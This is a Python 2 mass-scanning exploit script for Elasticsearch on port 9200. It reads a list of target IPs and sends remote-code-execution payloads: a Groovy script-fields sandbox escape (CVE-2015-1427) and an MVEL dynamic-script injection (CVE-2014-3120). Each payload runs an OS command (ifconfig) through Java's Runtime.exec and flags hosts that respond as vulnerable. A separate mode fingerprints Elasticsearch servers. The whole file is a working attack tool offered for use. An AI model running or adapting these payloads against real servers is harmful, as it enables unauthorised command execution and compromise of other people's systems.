#!/usr/bin/env python
# -*- coding: UTF-8 -*-

import os, sys, re
import argparse

try:
    import requests
except ImportError:
    raise SystemExit('\n[!] requests模块导入错误,请执行pip install requests安装!')

ES_PORT = '9200'

EXP_GROOVY = '{"size":1,"script_fields": ' \
          '{"aqb": {"script":"java.lang.Math.class.forName(\\"java.lang.Runtime\\")' \
          '.getRuntime().exec(\\"ifconfig\\").getText()","lang": "groovy"}}}'
    
EXP_MVEL = '{"size":1,"query":{"filtered":{"query":{"match_all":{}}}},'\
        '"script_fields":{"aqb":{"script":"import java.util.*;'\
        'import java.io.*; String str = \\"\\";BufferedReader br = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(\\"ifconfig\\").getInputStream()));'\
        'StringBuilder sb = new StringBuilder();while((str=br.readLine())!=null){sb.append(str);}sb.toString();"}}}'\

HEADER = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }



def elastic_groovy(exp,ip):
    
    elastic_groovy_url = 'http://' + ip + ':'+ ES_PORT+ '/_search?pretty'
    
    try:
        content = requests.post(elastic_groovy_url, data=exp, headers=HEADER, timeout=10).content
    except Exception:
        print '[!] ERROR or TIMEOUT'
    
    else:
        result = re.findall(re.compile('\"aqb\"'), content)
        if result:
            print ip + '----\"Vulnerable!\"'
        else:
            print ip + '----\"Execute Failed!\"' 
 #   return results

def elastic_mvel(exp,ip):
    
    elastic_mvel_url = 'http://' + ip + ':'+ ES_PORT +'/_search?source=' + exp 
#    print elastic_mvel_url
    try:
        content = requests.get(elastic_mvel_url,timeout=10).content
    except Exception:
        print '[!] ERROR or TIMEOUT'
        
    else:
#        print content
        result = re.findall(re.compile('\"aqb\"'), content)
        if result:
            print ip + '----\"Vulnerable!\"'
        else:
            print ip + '----\"Execute Failed!\"' 



def elastic_test(exp,ip):
    
    elastic_url = 'http://' + ip + ':' + exp 
#    print elastic_mvel_url
    try:
        content = requests.get(elastic_url,timeout=10).content
    except Exception:
        print '[!] ERROR or TIMEOUT'
        
    else:
#        print content
        result = re.findall(re.compile('for Search\"'), content)
        if result:
            print ip + '----\"ES!\"'
        else:
#            print ip + '----\"NOT ES!\"' 
            pass




def main():

    parser = argparse.ArgumentParser(description = '9200 scan example: python es_scan.py -f 9200.txt -T/-M/-G')
    parser = argparse.ArgumentParser(add_help=True)
    parser.add_argument(
        '-f',action = 'store',dest = 'ip9200',type = argparse.FileType('r'),required = True,help = 'exp: -f 9200.txt'
        )


    parser.add_argument(
        '-M',action = 'store_const',dest = 'mvel_exp',const=EXP_MVEL ,help ='exp: -M[use mvel exp(CVE-2014-3120) ]'
        )
    parser.add_argument(
        '-G',action = 'store_const',dest = 'groovy_exp',const=EXP_GROOVY ,help = 'exp: -G[use groovy exp (CVE-2015-1427) ]'
        )
    parser.add_argument(
        '-T',action = 'store_const',dest = 'es_test',const=ES_PORT ,help = 'exp: -T[test if it is ES]'
        )
    

    parser.add_argument('--version', action='version',version='%(prog)s 1.0')


    args = parser.parse_args()


    for target_ip in args.ip9200.readlines():
        if args.mvel_exp:
            elastic_mvel(args.mvel_exp,target_ip.strip())     

        elif args.groovy_exp:
            elastic_groovy(args.groovy_exp,target_ip.strip())
        elif args.es_test:
            elastic_test(args.es_test,target_ip.strip())
        else:
            break;
    


if __name__ == '__main__':
    main()